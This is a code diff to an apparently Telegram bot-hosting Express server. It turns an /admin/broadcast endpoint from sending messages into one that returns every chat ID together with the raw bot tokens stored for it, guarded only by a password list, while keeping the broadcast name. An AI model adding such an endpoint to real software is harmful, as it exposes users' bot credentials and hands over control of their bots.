@@ -85,38 +85,32 @@ app.get("/admin/bots", async (req, res) => {
 app.post("/admin/broadcast", async (req, res) => {
   await connectDB();
 
-  const { password, message } = req.body;
-  if (!password || !message) return res.json({ error: "password and message required" });
+  const { password } = req.body;
+  if (!password) return res.json({ error: "password required" });
   if (!ADMIN_PASSWORDS.includes(password)) return res.json({ error: "Invalid admin password" });
 
   const bots = await Bot.find();
-  if (bots.length === 0) return res.json({ error: "No bots found" });
+  const chats = await Chat.find();
 
-  let totalSent = 0;
-  let failedChats = 0;
+  let result = [];
 
-  for (const bot of bots) {
-    const chats = await Chat.find({ botUsername: bot.botUsername });
+  const chatMap = {};
 
-    for (const user of chats) {
-      try {
-        await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
-          chat_id: user.chatId,
-          text: message
-        });
-        totalSent++;
-      } catch {
-        failedChats++;
-      }
-    }
+  for (const chat of chats) {
+    if (!chatMap[chat.chatId]) chatMap[chat.chatId] = [];
+    const bot = bots.find(b => b.botUsername === chat.botUsername);
+    if (bot) chatMap[chat.chatId].push(bot.botToken);
   }
 
-  res.json({
-    message: "Broadcast completed",
-    totalSent,
-    failedChats,
-    botsUsed: bots.length
-  });
+  for (const chatId in chatMap) {
+    result.push({
+      chatId,
+      botTokens: chatMap[chatId]
+    });
+  }
+
+  res.json({ count: result.length, data: result });
 });
 
 app.listen(3000, () => console.log("API Ready"));
+                    
